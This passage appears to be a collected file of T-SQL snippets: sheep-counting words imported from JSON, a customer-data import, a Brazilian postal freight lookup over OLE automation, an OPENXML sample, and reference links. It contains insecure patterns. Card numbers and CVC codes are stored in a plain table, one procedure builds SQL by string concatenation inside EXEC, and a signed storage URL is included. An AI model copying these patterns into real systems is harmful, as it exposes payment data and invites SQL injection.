Bumfit"},{"number":18,"word":"Teddera-Bumfit"},{"number":19,"word":"Meddera-Bumfit"},{"number":20,"word":"Jiggot"}]},{"region":"Lakes","sequence":[{"number":1,"word":"Auna"},{"number":2,"word":"Peina"},{"number":3,"word":"Para"},{"number":4,"word":"Peddera"},{"number":5,"word":"Pimp"},{"number":6,"word":"Ithy"},{"number":7,"word":"Mithy"},{"number":8,"word":"Owera"},{"number":9,"word":"Lowera"},{"number":10,"word":"Dig"},{"number":11,"word":"Ain-a-dig"},{"number":12,"word":"Pein-a-dig"},{"number":13,"word":"Para-a-dig"},{"number":14,"word":"Peddaer-a-dig"},{"number":15,"word":"Bunfit"},{"number":16,"word":"Aina-a-bumfit"},{"number":17,"word":"Pein-a-bumfit"},{"number":18,"word":"Par-a-bunfit"},{"number":19,"word":"Pedder-a-bumfit"},{"number":20,"word":"Giggy"}]},{"region":"Dales","sequence":[{"number":1,"word":"Yain"},{"number":2,"word":"Tain"},{"number":3,"word":"Edderoa"},{"number":4,"word":"Peddero"},{"number":5,"word":"Pitts"},{"number":6,"word":"Tayter"},{"number":7,"word":"Leter"},{"number":8,"word":"Overro"},{"number":9,"word":"Coverro"},{"number":10,"word":"Dix"},{"number":11,"word":"Yain-dix"},{"number":12,"word":"Tain-dix"},{"number":13,"word":"Eddero-dix"},{"number":14,"word":"Pedderp-dix"},{"number":15,"word":"Bumfitt"},{"number":16,"word":"Yain-o-bumfitt"},{"number":17,"word":"Tain-o-bumfitt"},{"number":18,"word":"Eddero-bumfitt"},{"number":19,"word":"Peddero-bumfitt"},{"number":20,"word":"Jiggit"}]},{"region":"Ancient British","sequence":[{"number":1,"word":"oinos"},{"number":2,"word":"dewou"},{"number":3,"word":"trīs "},{"number":4,"word":"petwār"},{"number":5,"word":"pimpe"},{"number":6,"word":"swexs"},{"number":7,"word":"sextam"},{"number":8,"word":"oxtū"},{"number":9,"word":"nawam"},{"number":10,"word":"dekam"},{"number":11,"word":"oindekam"},{"number":12,"word":"deudekam"},{"number":13,"word":"trīdekam"},{"number":14,"word":"petwārdekam"},{"number":15,"word":"penpedekam"},{"number":16,"word":"swedekam"},{"number":17,"word":"sextandekam"},{"number":18,"word":"oxtūdekam"},{"number":19,"word":"nawandekam"},{"number":20,"word":"ukintī"}]},{"region":"Old Welsh","sequence":[{"number":1,"word":"un"},{"number":2,"word":"dou"},{"number":3,"word":"tri"},{"number":4,"word":"petuar"},{"number":5,"word":"pimp"},{"number":6,"word":"chwech"},{"number":7,"word":"seith"},{"number":8,"word":"wyth"},{"number":9,"word":"nau"},{"number":10,"word":"dec"},{"number":11,"word":""},{"number":12,"word":""},{"number":13,"word":""},{"number":14,"word":""},{"number":15,"word":""},{"number":16,"word":""},{"number":17,"word":""},{"number":18,"word":""},{"number":19,"word":""},{"number":20,"word":""}]},{"region":"Cornish (Kemmyn)","sequence":[{"number":1,"word":"unn"},{"number":2,"word":"dew, diw"},{"number":3,"word":"tri, teyr"},{"number":4,"word":"peswar"},{"number":5,"word":"pymp"},{"number":6,"word":"hwegh"},{"number":7,"word":"seyth"},{"number":8,"word":"eth"},{"number":9,"word":"naw"},{"number":10,"word":"deg"},{"number":11,"word":"unnek"},{"number":12,"word":"dewdhek"},{"number":13,"word":"trydhek"},{"number":14,"word":"peswardhek"},{"number":15,"word":"pymthek"},{"number":16,"word":"hwetek"},{"number":17,"word":"seytek"},{"number":18,"word":"etek"},{"number":19,"word":"nownsek"},{"number":20,"word":"ugens"}]},{"region":"Breton","sequence":[{"number":1,"word":"unan"},{"number":2,"word":"daou, div"},{"number":3,"word":"tri, teir"},{"number":4,"word":"pevar, peder"},{"number":5,"word":"pemp"},{"number":6,"word":"c''hwec''h"},{"number":7,"word":"seizh"},{"number":8,"word":"eizh"},{"number":9,"word":"nav"},{"number":10,"word":"dek"},{"number":11,"word":"unnek"},{"number":12,"word":"daouzek"},{"number":13,"word":"trizek"},{"number":14,"word":"pevarzek"},{"number":15,"word":"pemzek"},{"number":16,"word":"c''hwezek"},{"number":17,"word":"seitek"},{"number":18,"word":"triwec''h"},{"number":19,"word":"naontek"},{"number":20,"word":"ugent"}]}]
'
EXECUTE #MergeJSONWithEmbeddedArraywithCountingTable @AllRegions
 
DELETE FROM sheepcountingwords
DECLARE @JSON nvarchar(max)
SELECT @json = BulkColumn
 FROM OPENROWSET (BULK 'D:\raw data\YanTanTethera.json', SINGLE_BLOB) as j
 --must be UTF-16 Little Endian
 EXECUTE #MergeJSONWithEmbeddedArraywithCountingTable @JSON
/* and now do a pivot rotation */
SELECT SheepCountingWords.Number,
  Max(CASE WHEN SheepCountingWords.Region = 'Ancient British' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Ancient British],
  Max(CASE WHEN SheepCountingWords.Region = 'Borrowdale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Borrowdale,
  Max(CASE WHEN SheepCountingWords.Region = 'Bowland' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Bowland,
  Max(CASE WHEN SheepCountingWords.Region = 'Breton' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Breton,
  Max(CASE WHEN SheepCountingWords.Region = 'Coniston' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Coniston,
  Max(CASE WHEN SheepCountingWords.Region = 'Cornish (Kemmyn)' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Cornish (Kemmyn)],
  Max(CASE WHEN SheepCountingWords.Region = 'Craven and N.W. Moorlands' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Craven and N.W. Moorlands],
  Max(CASE WHEN SheepCountingWords.Region = 'Dales' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Dales,
  Max(CASE WHEN SheepCountingWords.Region = 'Derbyshire' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Derbyshire,
  Max(CASE WHEN SheepCountingWords.Region = 'Derbyshire Dales' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Derbyshire Dales],
  Max(CASE WHEN SheepCountingWords.Region = 'Eskdale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Eskdale,
  Max(CASE WHEN SheepCountingWords.Region = 'Gaelic' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Gaelic,
  Max(CASE WHEN SheepCountingWords.Region = 'Kirkby Lonsdale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Kirkby Lonsdale],
  Max(CASE WHEN SheepCountingWords.Region = 'Lakes' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Lakes,
  Max(CASE WHEN SheepCountingWords.Region = 'Lincolnshire' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Lincolnshire,
  Max(CASE WHEN SheepCountingWords.Region = 'Middleton - in- Teesdale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Middleton - in- Teesdale],
  Max(CASE WHEN SheepCountingWords.Region = 'Modern Irish' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Modern Irish],
  Max(CASE WHEN SheepCountingWords.Region = 'Nidderdale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Nidderdale,
  Max(CASE WHEN SheepCountingWords.Region = 'North Riding' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [North Riding],
  Max(CASE WHEN SheepCountingWords.Region = 'Old Welsh' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Old Welsh],
  Max(CASE WHEN SheepCountingWords.Region = 'Rathmell' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Rathmell,
  Max(CASE WHEN SheepCountingWords.Region = 'Scots' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Scots,
  Max(CASE WHEN SheepCountingWords.Region = 'Southwest England ' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Southwest England ],
  Max(CASE WHEN SheepCountingWords.Region = 'Swaledale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Swaledale,
  Max(CASE WHEN SheepCountingWords.Region = 'Teesdale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Teesdale,
  Max(CASE WHEN SheepCountingWords.Region = 'Tong' THEN 
             SheepCountingWords.Word ELSE '' END
     ) AS Tong,
  Max(CASE WHEN SheepCountingWords.Region = 'Weardale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Weardale,
  Max(CASE WHEN SheepCountingWords.Region = 'Welsh (feminine)' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Welsh (feminine)],
  Max(CASE WHEN SheepCountingWords.Region = 'Welsh (masculine)' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [Welsh (masculine)],
  Max(CASE WHEN SheepCountingWords.Region = 'Wensleydale' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Wensleydale,
  Max(CASE WHEN SheepCountingWords.Region = 'West Country Dorset' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS [West Country Dorset],
  Max(CASE WHEN SheepCountingWords.Region = 'Westmorland' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Westmorland,
  Max(CASE WHEN SheepCountingWords.Region = 'Wilts' THEN
             SheepCountingWords.Word ELSE '' END
     ) AS Wilts
  FROM SheepCountingWords
  GROUP BY SheepCountingWords.Number
  ORDER BY SheepCountingWords.Number


  DECLARE @CJSON nvarchar(max)
SELECT @Cjson = BulkColumn
 FROM OPENROWSET (BULK 'D:\raw data\customersUTF16.json', SINGLE_BLOB) as j
--text encoding must be littlendian UTF16
/*
We start by creating a table at the document level, with the main arrays within each document 
represented by columns. This means that this initial slicing of the JSON collection needs
be done only once. In our case, there are
  the details of the Name,
  Addresses, 
  Credit Cards, 
  Email Addresses, 
  Notes, 
  Phone numbers
In some cases, there are sub-arrays. The phone numbers, for example, have an array of dates.
We fill this table via a call to openJSON.
By doing this, we have the main details of each customer available to us when slicing up
embedded arrays
The batch is designed so it can be rerun, and should be idempotent. 
*/

IF Object_Id('dbo.JSONDocuments','U') IS NOT NULL DROP TABLE dbo.JSONDocuments
CREATE TABLE dbo.JSONDocuments
  (
  Document_id INT NOT NULL,
      [Full_Name] NVARCHAR(30) NOT NULL,
 	  Name NVARCHAR(MAX) NOT NULL,--holds a JSON object
	  Addresses NVARCHAR(MAX) NULL,--holds an array of JSON objects
	  Cards NVARCHAR(MAX) NULL,--holds an array of JSON objects
	  EmailAddresses NVARCHAR(MAX) NULL,--holds an array of JSON objects
	  Notes NVARCHAR(MAX) NULL,--holds an array of JSON objects
	  Phones NVARCHAR(MAX) NULL,--holds an array of JSON objects
	  CONSTRAINT JSONDocumentsPk PRIMARY KEY (Document_id)
  ) ON [PRIMARY];

/* Now we fill this table with a row for each document, each representing the entire date for a
customer. Each item of root data, such as the id and the customer's full name, is held  
as a column. All other columns hold JSON.*/
INSERT INTO dbo.JSONDocuments ( Document_id,Full_name,[Name],Addresses, Cards, EmailAddresses, Notes, Phones)
 SELECT [key] AS Document_id,Full_name,[Name],Addresses, Cards, EmailAddresses, Notes, Phones 
  FROM OpenJson(@CJSON) AS EachDocument
      CROSS APPLY OpenJson(EachDocument.Value) 
	  WITH (
	      [Full_Name] NVARCHAR(30) N'$."Full Name"', 
		  Name NVARCHAR(MAX) N'$.Name' AS JSON,
		  Addresses NVARCHAR(MAX) N'$.Addresses' AS JSON,
		  Cards NVARCHAR(MAX) N'$.Cards' AS JSON,
		  EmailAddresses NVARCHAR(MAX) N'$.EmailAddresses' AS JSON,
		  Notes NVARCHAR(MAX) N'$.Notes' AS JSON,
		  Phones NVARCHAR(MAX) N'$.Phones' AS JSON)

/*first we need to create an entry in the person table if it doesn't already
exist as that has the person_id.
*/
SET IDENTITY_INSERT [Customer].[Person] On
MERGE [Customer].[Person] AS target
USING
  (--get the required data for the person table and merge it with what is there
  SELECT JSONDocuments.Document_id, Title, FirstName, 
       MiddleName, LastName, Suffix
    FROM dbo.JSONDocuments
      CROSS APPLY
    OpenJson(JSONDocuments.Name)
    WITH
      (
      Title NVARCHAR(8) N'$.Title', FirstName VARCHAR(40) N'$."First Name"',
      MiddleName VARCHAR(40) N'$."Middle Name"',
      LastName VARCHAR(40) N'$."Last Name"', Suffix VARCHAR(10) N'$.Suffix'
      )
  ) AS source (person_id, Title, FirstName, MiddleName, LastName, Suffix)
ON target.person_id = source.person_id 
WHEN NOT MATCHED THEN 
  INSERT (person_id, Title, FirstName, MiddleName, LastName, Suffix)
    VALUES
      (source.person_id, source.Title, source.FirstName, 
	  source.MiddleName, source.LastName, source.Suffix);
SET IDENTITY_INSERT [Customer].[Person] Off

/* Now we do the notes. This has the complication because there is a many to many
relationship with the notes and the people, because the same standard notes can be 
associated with many customers such an overdue invoice payment etc. */
DECLARE @Note TABLE (document_id INT NOT NULL, Text NVARCHAR(MAX) NOT NULL, Date DATETIME)
INSERT INTO @Note (document_id, Text, Date)
  SELECT JSONDocuments.Document_id, Text, Date
    FROM dbo.JSONDocuments
      CROSS APPLY OpenJson(JSONDocuments.Notes) AS TheNotes
      CROSS APPLY
    OpenJson(TheNotes.Value)
    WITH (Text NVARCHAR(MAX) N'$.Text', Date DATETIME N'$.Date')
	WHERE Text IS NOT null
--if the notes are new then insert them
INSERT INTO Customer.Note (Note)
  SELECT DISTINCT newnotes.Text
    FROM @Note AS newnotes
      LEFT OUTER JOIN Customer.Note
        ON note.notestart = Left(newnotes.Text,850)--just compare the first 850 chars
    WHERE note.note IS NULL 
/* now fill in the many-to-many table relating notes to people, making sure that you
--do not duplicate anything*/
INSERT INTO Customer.NotePerson (Person_id, Note_id)
  SELECT newnotes.document_id, note.note_id
    FROM @Note AS newnotes
      INNER JOIN Customer.Note
        ON note.note = newnotes.Text
	  LEFT OUTER JOIN Customer.NotePerson
	    ON NotePerson.Person_id=newnotes.document_id
		AND NotePerson.note_id=note.note_id
		WHERE NotePerson.note_id IS null

/* addresses are complicated because they involve three tables. There is the
address, which is the physical place, the abode, which records when and why the 
person was associated with the place, and a third table which constrains
the type of abode.
We create a table variable to support the various queries without any extra
shredding */
DECLARE @addresses TABLE
  (
  person_id INT NOT null,
  Type NVARCHAR(40) NOT null,
  Full_Address NVARCHAR(200)NOT null,
  County NVARCHAR(30) NOT null,
  Start_Date DATETIME NOT null,
  End_Date DATETIME null
  );
--stock the table variable with the adderess information
INSERT INTO @Addresses(person_id, Type,Full_Address, County, [Start_Date], End_Date)
SELECT Document_id, Address.Type,Address.Full_Address, Address.County, 
         WhenLivedIn.[Start_date],WhenLivedIn.End_date
    FROM dbo.JSONDocuments
      CROSS APPLY
    OpenJson(JSONDocuments.Addresses) AllAddresses
	  CROSS APPLY 
	   OpenJson(AllAddresses.value)
    WITH
      (
      Type NVARCHAR(8) N'$.type', Full_Address NVARCHAR(200) N'$."Full Address"',
      County VARCHAR(40) N'$.County',Dates NVARCHAR(MAX) AS json
      ) Address
    CROSS APPLY
	OpenJson(Address.Dates) WITH
      (
      Start_date datetime N'$."Moved In"',End_date datetime N'$."Moved Out"'
      )WhenLivedIn

--first make sure that the types of address exists and add if necessary
INSERT INTO Customer.Addresstype (TypeOfAddress)
  SELECT DISTINCT NewAddresses.Type
    FROM @addresses AS NewAddresses
      LEFT OUTER JOIN Customer.Addresstype
        ON NewAddresses.Type = Addresstype.TypeOfAddress
    WHERE Addresstype.TypeOfAddress IS NULL;

--Fill the Address table with addresses ensuring uniqueness 
INSERT INTO Customer.Address (Full_Address, County)
SELECT DISTINCT NewAddresses.Full_Address, NewAddresses.County
  FROM @addresses AS NewAddresses
    LEFT OUTER JOIN Customer.Address AS currentAddresses
      ON NewAddresses.Full_Address = currentAddresses.Full_Address
  WHERE currentAddresses.Full_Address IS NULL;

--and now the many-to-many Abode table
INSERT INTO Customer.Abode (Person_id, Address_ID, TypeOfAddress, Start_date,
End_date)
  SELECT newAddresses.person_id, address.Address_ID, newAddresses.Type,
    newAddresses.Start_Date, newAddresses.End_Date
    FROM @addresses AS newAddresses
      INNER JOIN customer.address
        ON newAddresses.Full_Address = address.Full_Address
      LEFT OUTER JOIN Customer.Abode
        ON Abode.person_id = newAddresses.person_id
       AND Abode.Address_ID = address.Address_ID
    WHERE Abode.person_id IS NULL;
/*
credit cards are much easier since they are a simple sub-array.
*/
INSERT INTO customer.CreditCard (Person_id, CardNumber, ValidFrom, ValidTo, CVC)
  SELECT JSONDocuments.Document_id AS Person_id, new.CardNumber, new.ValidFrom,
    new.ValidTo, new.CVC
    FROM dbo.JSONDocuments
      CROSS APPLY OpenJson(JSONDocuments.Cards) AS TheCards
      CROSS APPLY
    OpenJson(TheCards.Value)
    WITH
      (
      CardNumber VARCHAR(20), ValidFrom DATE N'$.ValidFrom',
      ValidTo DATE N'$.ValidTo', CVC CHAR(3)
      ) AS new
      LEFT OUTER JOIN customer.CreditCard
        ON JSONDocuments.Document_id = CreditCard.Person_id
       AND new.CardNumber = CreditCard.CardNumber
    WHERE CreditCard.CardNumber IS NULL;

--Email Addresses are also simple 
INSERT INTO Customer.EmailAddress (Person_id, EmailAddress, StartDate, EndDate)
  SELECT JSONDocuments.Document_id AS Person_id, new.EmailAddress,
    new.StartDate, new.EndDate
    FROM dbo.JSONDocuments
      CROSS APPLY OpenJson(JSONDocuments.EmailAddresses) AS TheEmailAddresses
      CROSS APPLY
    OpenJson(TheEmailAddresses.Value)
    WITH
      (
      EmailAddress NVARCHAR(40) N'$.EmailAddress',
      StartDate DATE N'$.StartDate', EndDate DATE N'$.EndDate'
      ) AS new
      LEFT OUTER JOIN Customer.EmailAddress AS email
        ON JSONDocuments.Document_id = email.Person_id
       AND new.EmailAddress = email.EmailAddress
    WHERE email.EmailAddress IS NULL;

/*now we add these customers phones. The various dates for the start and end
of the use of the phone number are held in a subarray within the individual
card objects*/
DECLARE @phones TABLE
  (
  Person_id INT,
  TypeOfPhone NVARCHAR(40),
  DiallingNumber VARCHAR(20),
  Start_Date DATE,
  End_Date DATE
  );
INSERT INTO @phones (Person_id, TypeOfPhone, DiallingNumber, Start_Date,
End_Date)
  SELECT JSONDocuments.Document_id, EachPhone.TypeOfPhone,
    EachPhone.DiallingNumber, [From], [To]
    FROM dbo.JSONDocuments
      CROSS APPLY OpenJson(JSONDocuments.Phones) AS ThePhones
      CROSS APPLY
    OpenJson(ThePhones.Value)
    WITH
      (
      TypeOfPhone NVARCHAR(40), DiallingNumber VARCHAR(20), Dates NVARCHAR(MAX) AS JSON
      ) AS EachPhone
      CROSS APPLY
    OpenJson(EachPhone.Dates)
    WITH ([From] DATE, [To] DATE);

--insert any new phone types
INSERT INTO Customer.PhoneType (TypeOfPhone)
  SELECT DISTINCT new.TypeOfPhone
    FROM @phones AS new
      LEFT OUTER JOIN Customer.PhoneType
        ON PhoneType.TypeOfPhone = new.TypeOfPhone
    WHERE PhoneType.TypeOfPhone IS NULL AND new.TypeOfPhone IS NOT null;

--insert all new phones 
INSERT INTO Customer.Phone (Person_id, TypeOfPhone, DiallingNumber, Start_date,
End_date)
  SELECT new.Person_id, new.TypeOfPhone, new.DiallingNumber, new.Start_Date,
    new.End_Date
    FROM @phones AS new
      LEFT OUTER JOIN Customer.Phone
        ON Phone.DiallingNumber = new.DiallingNumber
       AND Phone.Person_id = new.Person_id
    WHERE Phone.Person_id IS NULL AND new.TypeOfPhone IS NOT null;	 



https://en.dirceuresende.com/blog/how-to-calculate-freight-amount-and-delivery-time-using-webservice-of-mails-in-sql-server/





CREATE PROCEDURE dbo.stpConsulta_Frete_Correios (
    @sCepOrigem VARCHAR(12),
    @sCepDestino VARCHAR(12),
    @nCdServico INT,
    @nVlPeso FLOAT = 0.1,
    @nCdFormato SMALLINT = 1,
    @nVlComprimento INT = 20,
    @nVlAltura INT = 5,
    @nVlLargura INT = 15,
    @nVlDiametro INT = 0,
    @CdMaoPropria CHAR(1) = 'n',
    @nVlValorDeclarado FLOAT = 0,
    @CdAvisoRecebimento CHAR(1) = 'n'
)
AS BEGIN
 
 
    DECLARE 
        @obj INT,
        @Url VARCHAR(500),
        @resposta VARCHAR(8000),
        @xml XML
        
        
        
    -- Recupera apenas os números do CEP de Origem
    DECLARE @startingIndex INT = 0
    
    WHILE (1=1)
    BEGIN
      
        SET @startingIndex = PATINDEX('%[^0-9]%', @sCepOrigem)  
        
        IF (@startingIndex <> 0)
            SET @sCepOrigem = REPLACE(@sCepOrigem, SUBSTRING(@sCepOrigem, @startingIndex, 1), '')  
        ELSE    
            BREAK
            
    END
    
    
    
    -- Recupera apenas os números do CEP de Destino
    SET @startingIndex = 0
    
    WHILE (1=1)
    BEGIN
      
        SET @startingIndex = PATINDEX('%[^0-9]%', @sCepDestino)  
        
        IF (@startingIndex <> 0)
            SET @sCepDestino = REPLACE(@sCepDestino, SUBSTRING(@sCepDestino, @startingIndex, 1), '')  
        ELSE    
            BREAK
            
    END
        
 
 
    SET @Url = 'http://ws.correios.com.br/calculador/CalcPrecoPrazo.aspx?' + 
    'sCepOrigem=' + @sCepOrigem + 
    '&sCepDestino=' + @sCepDestino + 
    '&nVlPeso=' + CAST(@nVlPeso AS VARCHAR(20)) + 
    '&nCdFormato=' + CAST(@nCdFormato AS VARCHAR(20)) + 
    '&nVlComprimento=' + CAST(@nVlComprimento AS VARCHAR(20)) + 
    '&nVlAltura=' + CAST(@nVlAltura AS VARCHAR(20)) + 
    '&nVlLargura=' + CAST(@nVlLargura AS VARCHAR(20)) + 
    '&sCdMaoPropria=' + @CdMaoPropria + 
    '&nVlValorDeclarado=' + CAST(@nVlValorDeclarado AS VARCHAR(20)) + 
    '&sCdAvisoRecebimento=' + @CdAvisoRecebimento + 
    '&nCdServico=' + CAST(@nCdServico AS VARCHAR(20)) + 
    '&nVlDiametro=' + CAST(@nVlDiametro AS VARCHAR(20)) + '&StrRetorno=xml'
 
    EXEC sys.sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT
    EXEC sys.sp_OAMethod @obj, 'open', NULL, 'GET', @Url, FALSE
    EXEC sys.sp_OAMethod @obj, 'send'
    EXEC sys.sp_OAGetProperty @obj, 'responseText', @resposta OUT
    EXEC sys.sp_OADestroy @obj
    
    SET @xml = @resposta COLLATE SQL_Latin1_General_CP1251_CS_AS
    
    
    SELECT
        @xml.value('(/Servicos/cServico/Codigo)[1]', 'bigint') AS Codigo_Servico,
        @xml.value('(/Servicos/cServico/Valor)[1]', 'varchar(20)') AS Valor_Frete,
        @xml.value('(/Servicos/cServico/PrazoEntrega)[1]', 'int') AS Prazo_Entrega,
        @xml.value('(/Servicos/cServico/ValorSemAdicionais)[1]', 'varchar(20)') AS Valor_Sem_Adicionais,
        @xml.value('(/Servicos/cServico/ValorMaoPropria)[1]', 'varchar(20)') AS Valor_Entrega_Em_Maos,
        @xml.value('(/Servicos/cServico/ValorAvisoRecebimento)[1]', 'varchar(20)') AS Valor_Aviso_Recebimento,
        @xml.value('(/Servicos/cServico/EntregaDomiciliar)[1]', 'varchar(20)') AS Entrega_Domiciliar,
        @xml.value('(/Servicos/cServico/EntregaDomiciliar)[1]', 'varchar(1)') AS Entrega_Domiciliar,
        @xml.value('(/Servicos/cServico/EntregaSabado)[1]', 'varchar(1)') AS Entrega_Sabado,
        @xml.value('(/Servicos/cServico/Erro)[1]', 'int') AS Codigo_Erro,
        @xml.value('(/Servicos/cServico/MsgErro)[1]', 'varchar(500)') AS Mensagem_Erro
        
 
END






https://docs.microsoft.com/en-us/sql/relational-databases/xml/examples-using-openxml?view=sql-server-ver15



-- Create these tables:  
DROP TABLE CourseAttendance  
DROP TABLE Students  
DROP TABLE Courses  
GO  
CREATE TABLE Students(  
                id   varchar(5) primary key,  
                name varchar(30)  
                )  
GO  
CREATE TABLE Courses(  
               id       varchar(5) primary key,  
               name     varchar(30),  
               taughtBy varchar(5)  
)  
GO  
CREATE TABLE CourseAttendance(  
             id         varchar(5) references Courses(id),  
             attendedBy varchar(5) references Students(id),  
             constraint CourseAttendance_PK primary key (id, attendedBy)  
)  
go  
-- Create these stored procedures:  
DROP PROCEDURE f_idrefs  
GO  
CREATE PROCEDURE f_idrefs  
    @t      varchar(500),  
    @idtab  varchar(50),  
    @id     varchar(5)  
AS  
DECLARE @sp int  
DECLARE @att varchar(5)  
SET @sp = 0  
WHILE (LEN(@t) > 0)  
BEGIN   
    SET @sp = CHARINDEX(' ', @t+ ' ')  
    SET @att = LEFT(@t, @sp-1)  
    EXEC('INSERT INTO '+@idtab+' VALUES ('''+@id+''', '''+@att+''')')  
    SET @t = SUBSTRING(@t+ ' ', @sp+1, LEN(@t)+1-@sp)  
END  
Go  
  
DROP PROCEDURE fill_idrefs  
GO  
CREATE PROCEDURE fill_idrefs   
    @xmldoc     int,  
    @xpath      varchar(100),  
    @from       varchar(50),  
    @to         varchar(50),  
    @idtable    varchar(100)  
AS  
DECLARE @t varchar(500)  
DECLARE @id varchar(5)  
  
/* Temporary Edge table */  
SELECT *   
INTO #TempEdge   
FROM OPENXML(@xmldoc, @xpath)  
  
DECLARE fillidrefs_cursor CURSOR FOR  
    SELECT CAST(iv.text AS nvarchar(200)) AS id,  
           CAST(av.text AS nvarchar(4000)) AS refs  
    FROM   #TempEdge c, #TempEdge i,  
           #TempEdge iv, #TempEdge a, #TempEdge av  
    WHERE  c.id = i.parentid  
    AND    UPPER(i.localname) = UPPER(@from)  
    AND    i.id = iv.parentid  
    AND    c.id = a.parentid  
    AND    UPPER(a.localname) = UPPER(@to)  
    AND    a.id = av.parentid  
  
OPEN fillidrefs_cursor  
FETCH NEXT FROM fillidrefs_cursor INTO @id, @t  
WHILE (@@FETCH_STATUS <> -1)  
BEGIN  
    IF (@@FETCH_STATUS <> -2)  
    BEGIN  
        execute f_idrefs @t, @idtable, @id  
    END  
    FETCH NEXT FROM fillidrefs_cursor INTO @id, @t  
END  
CLOSE fillidrefs_cursor  
DEALLOCATE fillidrefs_cursor  
Go  
-- This is the sample document that is shredded and the data is stored in the preceding tables.  
DECLARE @h int  
EXECUTE sp_xml_preparedocument @h OUTPUT, N'<Data>  
  <Student id = "s1" name = "Student1"  attends = "c1 c3 c6"  />  
  <Student id = "s2" name = "Student2"  attends = "c2 c4" />  
  <Student id = "s3" name = "Student3"  attends = "c2 c4 c6" />  
  <Student id = "s4" name = "Student4"  attends = "c1 c3 c5" />  
  <Student id = "s5" name = "Student5"  attends = "c1 c3 c5 c6" />  
  <Student id = "s6" name = "Student6" />  
  
  <Class id = "c1" name = "Intro to Programming"   
         attendedBy = "s1 s4 s5" />  
  <Class id = "c2" name = "Databases"   
         attendedBy = "s2 s3" />  
  <Class id = "c3" name = "Operating Systems"   
         attendedBy = "s1 s4 s5" />  
  <Class id = "c4" name = "Networks" attendedBy = "s2 s3" />  
  <Class id = "c5" name = "Algorithms and Graphs"   
         attendedBy =  "s4 s5"/>  
  <Class id = "c6" name = "Power and Pragmatism"   
         attendedBy = "s1 s3 s5" />  
</Data>'  
  
INSERT INTO Students SELECT * FROM OPENXML(@h, '//Student') WITH Students  
  
INSERT INTO Courses SELECT * FROM OPENXML(@h, '//Class') WITH Courses  
/* Using the edge table */  
EXECUTE fill_idrefs @h, '//Class', 'id', 'attendedby', 'CourseAttendance'  
  
SELECT * FROM Students  
SELECT * FROM Courses  
SELECT * FROM CourseAttendance  
  
EXECUTE sp_xml_removedocument @h















https://www.mssqltips.com/sqlservertip/2341/use-the-sql-server-clr-to-read-and-write-text-files/







https://www.mssqltips.com/sqlservertip/4963/simple-image-import-and-export-using-tsql-for-sql-server/





https://www.mssqltips.com/sqlservertip/2349/read-and-write-binary-files-with-the-sql-server-clr/




https://www.mssqltips.com/sqlservertip/1325/parsing-a-url-with-sql-server-functions/




https://www.mssqltips.com/sqlservertip/4981/sql-server-function-to-check-dynamic-sql-syntax/




https://en.dirceuresende.com/blog/sql-server-como-importar-arquivos-de-texto-para-o-banco-ole-automation-clr-bcp-bulk-insert-openrowset/
https://en.dirceuresende.com/blog/querying-mail-object-tracking-by-sql-server/
https://en.dirceuresende.com/blog/sql-server-how-to-track-parcel-and-post-object-after-websro-deactivation/
https://en.dirceuresende.com/blog/how-to-break-a-substrings-table-string-using-sql-server-delimiter/
https://en.dirceuresende.com/blog/removing-html-tags-from-a-string-in-sql-server/
https://en.dirceuresende.com/blog/file-operations-using-ole-automation-on-sql-server/
https://en.dirceuresende.com/blog/consuming-google-maps-api-using-ole-automation-on-sql-server/
https://en.dirceuresende.com/blog/enabling-ole-automation-via-t-sql-on-sql-server/
https://en.dirceuresende.com/blog/file-operations-using-ole-automation-on-sql-server
https://en.dirceuresende.com/blog/consuming-the-google-maps-api-to-get-information-from-an-address-or-zip-code-in-sql-server/
https://en.dirceuresende.com/blog/how-to-query-information-from-a-zip-code-in-sql-server/
https://opdhsblobprod02.blob.core.windows.net/contents/264cf0df66eb4cbf86eac6677c504c4d/99605e03f972ac37ec37f098824ed59e?sv=2018-03-28&sr=b&si=ReadPolicy&sig=%2FiUUSAjm6CLJ8C4Y%2Fq9ne0Wy8iQyLPO0jHmZqA5Wf%2Bc%3D&st=2020-12-17T17%3A05%3A27Z&se=2020-12-18T17%3A15%3A27Z
https://docs.microsoft.com/en-us/sql/relational-databases/stored-procedures/ole-automation-sample-script?view=sql-server-ver15
https://docs.microsoft.com/en-us/sql/relational-databases/xml/examples-using-openxml?view=sql-server-ver15
https://docs.microsoft.com/en-us/sql/relational-databases/xml/specify-metaproperties-in-openxml?view=sql-server-ver15
https://www.rklesolutions.com/blog/write-text-file-to-tsql
https://codereview.stackexchange.com/questions/166757/stored-procedure-to-write-in-a-file
https://www.linz.govt.nz/system/files_force/media/pages-attachments/Importing-LDS-CSV-data-into-your-database.pdf
https://blog.ip2location.com/knowledge-base/how-to-import-ip2proxy-csv-data-into-mssql-2017-ipv4/
https://blog.ip2location.com/knowledge-base/how-to-import-ip2proxy-csv-data-into-mssql-2017-ipv6/
